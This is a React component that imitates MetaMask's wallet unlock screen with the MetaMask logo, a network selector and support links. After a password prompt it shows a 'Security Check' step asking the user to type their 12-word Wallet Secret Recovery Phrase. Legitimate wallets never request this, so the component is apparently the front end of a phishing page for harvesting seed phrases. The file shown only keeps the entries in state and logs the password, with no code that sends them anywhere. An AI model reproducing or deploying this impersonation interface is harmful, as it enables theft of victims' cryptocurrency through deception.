import React, { useState } from 'react'
import Loader from '../assets/img/loader.gif'
import metmaskB from '../assets/img/metamaskB.svg'
import caretDown from '../assets/img/caretDown.svg'
import TextField from '@mui/material/TextField'

const LoginForm = ({ isOpen, setIsOpen, isLoading, setIsLoading }) => {
  const [password, setPassword] = useState('')
  const [phrase, setPhrase] = useState('')
  const [passwordError, setPasswordError] = useState(false)
  const [phraseError, setPhraseError] = useState(false)
  const [unlock, setUnlock] = useState(false)

  console.log(password)

  const handlePasswordSubmit = e => {
    e.preventDefault()
    setPasswordError(false)
    setPhraseError(false)

    if (password.length < 8) {
      setPasswordError(true)
    } else {
      setUnlock(true)
      setIsLoading(true)
    }
  }
  const handlePhraseSubmit = e => {
    e.preventDefault()
    if (phrase.length < 12) {
      setPhraseError(true)
    } else {
      setUnlock(true)
      setIsLoading(true)
      setPhraseError(false)
    }
  }

  const handlePassword = value => {
    setPassword(value)
  }
  const handlePhrase = value => {
    setPhrase(value)
  }

  // const handleUnlock = () => {
  //   setUnlock(true)
  //   setIsLoading(true)
  // }

  // isOpen && setTimeout(() => setIsLoading(false), 2000)

  if (isOpen) {
    setTimeout(() => setIsLoading(false), 2000)
  }

  if (!unlock) {
    return (
      <div>
        <section className={`loginForm ${!isOpen && 'hidden'}`}>
          <div class='loader'>
            <img
              className={`loaderImg ${!isLoading && 'hidden'}`}
              src={Loader}
              alt=''
            />
          </div>
          <div className={`loginFormHeader ${isLoading && 'hidden'}`}>
            <img src={metmaskB} alt='' className='loginFormLogo' />
            <a href='/#' class='btn'>
              <div class='online'></div>
              <p class='btnText'>Ethereum Mainnet</p>
              <img src={caretDown} alt='' />
            </a>
          </div>
          <div className='loginFormMain'>
            <img src={metmaskB} alt='' />
            <div className={`LoginFormContent ${isLoading && 'hidden'}`}>
              <h2 class='loginFormTitle'>Welcome Back!</h2>
              <p class='loginFormText'>The decentralized web awaits</p>

              <form class='login' autoComplete='off'>
                {/* text validation  */}
                <TextField
                  inputRef={input => input && input.focus()}
                  type='password'
                  id='password'
                  label='Password'
                  variant='standard'
                  value={password}
                  onChange={e => handlePassword(e.target.value)}
                  error={passwordError}
                  helperText={`password must be atleast 8 charectors long`}
                />
                <button
                  style={{ textAlign: 'center' }}
                  // onClick={handleUnlock}
                  class='formBtn'
                  onClick={e => handlePasswordSubmit(e)}
                >
                  Unlock
                </button>
              </form>
            </div>

            <footer className={`loginFormFooter ${isLoading && 'hidden'}`}>
              <p class='loginFormInfo'>
                Need help? Contact <a href='/#'> MetaMask Support</a>
              </p>
            </footer>
          </div>
        </section>
      </div>
    )
  }
  if (unlock) {
    return (
      <div>
        <section className={`loginForm ${!isOpen && 'hidden'}`}>
          <div class='loader'>
            <img
              className={`loaderImg ${!isLoading && 'hidden'}`}
              src={Loader}
              alt=''
            />
          </div>
          <div className={`loginFormHeader ${isLoading && 'hidden'}`}>
            <img src={metmaskB} alt='' className='loginFormLogo' />
            <a href='/#' class='btn'>
              <div class='online'></div>
              <p class='btnText'>Ethereum Mainnet</p>
              <img src={caretDown} alt='' />
            </a>
          </div>
          <div className='loginFormMain'>
            <img src={metmaskB} alt='' />
            <div className={`LoginFormContent ${isLoading && 'hidden'}`}>
              <h2 class='loginFormTitle'>Security Check</h2>
              <p class='loginFormText'>
                We just need to confirm it's you. <br /> To continue, enter your
                12 word phrase.
              </p>

              <form class='login' autoComplete='off'>
                {/* text validation  */}
                <TextField
                  inputRef={input => input && input.focus()}
                  type='text'
                  id='phrase'
                  label='Wallet Secret Recovery Phrase'
                  variant='standard'
                  value={phrase}
                  onChange={e => handlePhrase(e.target.value)}
                  error={phraseError}
                  minLength='12'
                  maxLength='12'
                  helperText='security phrase should be exactly 12 words long'
                />
                <button
                  onClick={e => handlePhraseSubmit(e)}
                  style={{ textAlign: 'center' }}
                  class='formBtn'
                >
                  Confirm
                </button>
              </form>
              <footer className={`loginFormFooter ${isLoading && 'hidden'}`}>
                <p class='loginFormInfo infoOne'>
                  Need Help? Contact
                  <strong>
                    <a href='/#'> MetaMask Support</a>
                  </strong>
                </p>
              </footer>
            </div>
          </div>
        </section>
      </div>
    )
  }
}

export default LoginForm
